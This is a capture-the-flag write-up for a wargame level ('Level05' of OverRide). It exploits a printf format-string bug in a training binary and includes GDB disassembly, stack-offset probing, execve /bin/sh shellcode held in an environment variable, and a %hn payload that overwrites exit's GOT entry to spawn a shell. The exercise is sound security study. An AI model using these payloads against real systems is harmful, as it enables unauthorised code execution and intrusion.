# Level05

### Exploit :

Format string + env

### Step 1 :

```
level05@OverRide:~$ ./level05
bonjour
bonjour
level05@OverRide:~$ ./level05 bonjour
Hello World
hello world
level05@OverRide:~$
```

the program reads from stdin and then prints the result in lowercase.

### Step 2 :

First, let's look at the functions used :

```bash
(gdb) info function
All defined functions:

Non-debugging symbols:
0x080482f8  _init
0x08048340  printf
0x08048340  printf@plt
0x08048350  fgets
0x08048350  fgets@plt
0x08048360  __gmon_start__
0x08048360  __gmon_start__@plt
0x08048370  exit
0x08048370  exit@plt
0x08048380  __libc_start_main
0x08048380  __libc_start_main@plt
0x08048390  _start
0x080483c0  __do_global_dtors_aux
0x08048420  frame_dummy
0x08048444  main
0x08048520  __libc_csu_init
0x08048590  __libc_csu_fini
0x08048592  __i686.get_pc_thunk.bx
0x080485a0  __do_global_ctors_aux
0x080485cc  _fini
```

We only have a main function and one exploitable function (printf)

Let's see main function :

```
(gdb) disas main
Dump of assembler code for function main:
   0x08048444 <+0>:	push   ebp
   0x08048445 <+1>:	mov    ebp,esp
   0x08048447 <+3>:	push   edi
   0x08048448 <+4>:	push   ebx
   0x08048449 <+5>:	and    esp,0xfffffff0
   0x0804844c <+8>:	sub    esp,0x90																								// Allocates 144 bytes
   0x08048452 <+14>:	mov    DWORD PTR [esp+0x8c],0x0
   0x0804845d <+25>:	mov    eax,ds:0x80497f0
   0x08048462 <+30>:	mov    DWORD PTR [esp+0x8],eax
   0x08048466 <+34>:	mov    DWORD PTR [esp+0x4],0x64															// Buffer 100 bytes 
   0x0804846e <+42>:	lea    eax,[esp+0x28]
   0x08048472 <+46>:	mov    DWORD PTR [esp],eax																	
   0x08048475 <+49>:	call   0x8048350 <fgets@plt>																// call fgets
   0x0804847a <+54>:	mov    DWORD PTR [esp+0x8c],0x0
   0x08048485 <+65>:	jmp    0x80484d3 <main+143>
   0x08048487 <+67>:	lea    eax,[esp+0x28]
   0x0804848b <+71>:	add    eax,DWORD PTR [esp+0x8c]
   0x08048492 <+78>:	movzx  eax,BYTE PTR [eax]
   0x08048495 <+81>:	cmp    al,0x40
   0x08048497 <+83>:	jle    0x80484cb <main+135>
   0x08048499 <+85>:	lea    eax,[esp+0x28]
   0x0804849d <+89>:	add    eax,DWORD PTR [esp+0x8c]
   0x080484a4 <+96>:	movzx  eax,BYTE PTR [eax]
   0x080484a7 <+99>:	cmp    al,0x5a																								// if buffer > 90
   0x080484a9 <+101>:	jg     0x80484cb <main+135>
   0x080484ab <+103>:	lea    eax,[esp+0x28]
   0x080484af <+107>:	add    eax,DWORD PTR [esp+0x8c]
   0x080484b6 <+114>:	movzx  eax,BYTE PTR [eax]
   0x080484b9 <+117>:	mov    edx,eax
   0x080484bb <+119>:	xor    edx,0x20																								// tolower
   0x080484be <+122>:	lea    eax,[esp+0x28]
   0x080484c2 <+126>:	add    eax,DWORD PTR [esp+0x8c]
   0x080484c9 <+133>:	mov    BYTE PTR [eax],dl
   0x080484cb <+135>:	add    DWORD PTR [esp+0x8c],0x1
   0x080484d3 <+143>:	mov    ebx,DWORD PTR [esp+0x8c]
   0x080484da <+150>:	lea    eax,[esp+0x28]
   0x080484de <+154>:	mov    DWORD PTR [esp+0x1c],0xffffffff
   0x080484e6 <+162>:	mov    edx,eax
   0x080484e8 <+164>:	mov    eax,0x0
   0x080484ed <+169>:	mov    ecx,DWORD PTR [esp+0x1c]
   0x080484f1 <+173>:	mov    edi,edx
   0x080484f3 <+175>:	repnz scas al,BYTE PTR es:[edi]
   0x080484f5 <+177>:	mov    eax,ecx
   0x080484f7 <+179>:	not    eax
   0x080484f9 <+181>:	sub    eax,0x1
   0x080484fc <+184>:	cmp    ebx,eax
   0x080484fe <+186>:	jb     0x8048487 <main+67>
   0x08048500 <+188>:	lea    eax,[esp+0x28]
   0x08048504 <+192>:	mov    DWORD PTR [esp],eax
   0x08048507 <+195>:	call   0x8048340 <printf@plt>																	// call to printf(buffer)
   0x0804850c <+200>:	mov    DWORD PTR [esp],0x0
   0x08048513 <+207>:	call   0x8048370 <exit@plt>
End of assembler dump.
```

The program reads with fgets, switches the input to lower case and prints the string.

### Step 3 :

When we connect to the level we can already see that the stack is not executable (NX), so we will use a shellcode in an environment variable then execute it through format string with printf.
First, I need to know the position used (buffer)

```
level05@OverRide:~$ python -c 'print "AAAA"+ " %08x |" * 30' | ./level05
aaaa 00000064 | f7fcfac0 | f7ec3af9 | ffffd6af | ffffd6ae | 00000000 | ffffffff | ffffd734 | f7fdb000 | 61616161 | 38302520 | 207c2078 | 78383025 |
```

Buffer is in 10th position.

Next step store my shellcode inside my env

```
export PAYLOAD=$(python -c 'print "\x90"  * 100 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x31\xd2\xb0\x0b\xcd\x80"')
```

```
(gdb) x/40s *environ
[...]
0xffffdf36:	 "PAYLOAD=\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\061\300Ph//shh/bin\211\343\061\311\061Ұ\v̀"
[...]
```

```
level05@OverRide:~$ objdump --disassemble-all level05
...
08048370 <exit@plt>:
 8048370:	ff 25 e0 97 04 08    	jmp    *0x80497e0
 8048376:	68 18 00 00 00       	push   $0x18
 804837b:	e9 b0 ff ff ff       	jmp    8048330 <_init+0x38>
...
```

Now, I had all informations

- address of exit
- printf position
- address of my env variable

There address are too big, so I need to split it for create 2 short.

```bash
add exit + add exit+2 + 1th part of my shellcode + "%10$hn" + 2nd part of my shellcode + "%11$hn"'

"\xe0\x97\x04\x08" + "\xe2\x97\x04\x08" + "%57192d" + "%10$hn" + "%8335d" + "%11$hn"
																							|											|
									(addr + size name + half nop)	- 8					0xffff - address of 1 part
```

```
(python -c 'print "\xe0\x97\x04\x08" + "\xe2\x97\x04\x08" + "%57192d" + "%10$hn" + "%8335d" + "%11$hn"'; cat) | ./level05
```

Level05 done !